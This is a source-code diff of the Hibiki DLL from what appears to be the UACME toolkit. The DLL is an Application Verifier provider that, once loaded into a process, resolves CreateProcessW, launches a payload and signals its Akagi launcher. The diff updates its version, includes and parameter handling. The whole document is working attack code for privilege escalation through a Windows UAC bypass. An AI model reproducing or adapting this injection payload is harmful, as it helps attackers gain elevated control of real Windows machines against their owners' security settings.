@@ -4,9 +4,9 @@
 *
 *  TITLE:       DLLMAIN.C
 *
-*  VERSION:     2.89
+*  VERSION:     3.10
 *
-*  DATE:        14 Jun 2018
+*  DATE:        18 Nov 2018
 *
 *  AVrf entry point, Hibiki Kai Ni.
 *
@@ -21,28 +21,8 @@
 #error ANSI build is not supported
 #endif
 
-//disable nonmeaningful warnings.
-#pragma warning(disable: 4005) // macro redefinition
-#pragma warning(disable: 4055) // %s : from data pointer %s to function pointer %s
-#pragma warning(disable: 4152) // nonstandard extension, function/data pointer conversion in expression
-#pragma warning(disable: 4201) // nonstandard extension used : nameless struct/union
-#pragma warning(disable: 6102) // Using %s from failed function call at line %u
-
-#include <windows.h>
-#include <ntstatus.h>
-#include "shared\ntos.h"
-#include "shared\minirtl.h"
-#include "shared\util.h"
-#include "shared\windefend.h"
-
-#if (_MSC_VER >= 1900) 
-#ifdef _DEBUG
-#pragma comment(lib, "vcruntimed.lib")
-#pragma comment(lib, "ucrtd.lib")
-#else
-#pragma comment(lib, "libvcruntime.lib")
-#endif
-#endif
+#include "shared\shared.h"
+#include "shared\libinc.h"
 
 #define LoadedMsg      "Hibiki lock and loaded"
 
@@ -52,6 +32,8 @@ static RTL_VERIFIER_DLL_DESCRIPTOR avrfDlls[2];
 static HMODULE g_pvKernel32;
 
 PFNCREATEPROCESSW pCreateProcessW = NULL;
+
+UACME_PARAM_BLOCK g_SharedParams;
 
 /*
 * ucmLoadCallback
@@ -68,10 +50,12 @@ VOID NTAPI ucmLoadCallback(
     PVOID Reserved
 )
 {
-    BOOL bReadSuccess, bIsLocalSystem = FALSE;
+    BOOL bSharedParamsReadOk;
+
+    NTSTATUS Status;
 
     PWSTR lpParameter = NULL;
-    ULONG cbParameter = 0L;
+    ULONG cbParameter = 0UL;
 
     UNREFERENCED_PARAMETER(DllSize);
     UNREFERENCED_PARAMETER(Reserved);
@@ -81,42 +65,56 @@ VOID NTAPI ucmLoadCallback(
     }
 
     if (_strcmpi(DllName, L"kernel32.dll") == 0) {
-        g_pvKernel32 = DllBase;
+        g_pvKernel32 = (HMODULE)DllBase;
     }
 
     if (_strcmpi(DllName, L"user32.dll") == 0) {
         if (g_pvKernel32) {
-            
-            pCreateProcessW = ucmLdrGetProcAddress(
-                (PCHAR)g_pvKernel32, 
+
+#pragma warning(push)
+#pragma warning(disable: 4152)
+
+            pCreateProcessW = (PFNCREATEPROCESSW)ucmLdrGetProcAddress(
+                (PCHAR)g_pvKernel32,
                 "CreateProcessW");
+
+#pragma warning(pop)
 
             if (pCreateProcessW != NULL) {
 
-                ucmIsLocalSystem(&bIsLocalSystem);
-
-                bReadSuccess = ucmReadParameters(
-                    &lpParameter,
-                    &cbParameter,
-                    NULL,
-                    NULL,
-                    bIsLocalSystem);
-
-                ucmLaunchPayloadEx(
-                    pCreateProcessW,
-                    lpParameter,
-                    cbParameter);
-
-                if ((bReadSuccess) && 
-                    (lpParameter != NULL)) 
-                {
-                    RtlFreeHeap(
-                        NtCurrentPeb()->ProcessHeap,
-                        0,
-                        lpParameter);
+                //
+                // Read shared params block.
+                //
+                RtlSecureZeroMemory(&g_SharedParams, sizeof(g_SharedParams));
+                bSharedParamsReadOk = ucmReadSharedParameters(&g_SharedParams);
+                if (bSharedParamsReadOk) {
+                    lpParameter = g_SharedParams.szParameter;
+                    cbParameter = (ULONG)(_strlen(g_SharedParams.szParameter) * sizeof(WCHAR));
+                }
+                else {
+                    lpParameter = NULL;
+                    cbParameter = 0UL;
                 }
 
-                NtTerminateProcess(NtCurrentProcess(), STATUS_SUCCESS);
+                if (ucmLaunchPayloadEx(
+                    pCreateProcessW,
+                    lpParameter,
+                    cbParameter))
+                {
+                    Status = STATUS_SUCCESS;
+                }
+                else {
+                    Status = STATUS_UNSUCCESSFUL;
+                }
+
+                //
+                // Notify Akagi.
+                //
+                if (bSharedParamsReadOk) {
+                    ucmSetCompletion(g_SharedParams.szSignalObject);
+                }
+
+                NtTerminateProcess(NtCurrentProcess(), Status);
             }
         }
     }
@@ -167,7 +165,7 @@ BOOL WINAPI DllMain(
     _In_ LPVOID lpvReserved
 )
 {
-    PRTL_VERIFIER_PROVIDER_DESCRIPTOR* pVPD = lpvReserved;
+    PRTL_VERIFIER_PROVIDER_DESCRIPTOR* pVPD = (PRTL_VERIFIER_PROVIDER_DESCRIPTOR*)lpvReserved;
 
     UNREFERENCED_PARAMETER(hinstDLL);
 
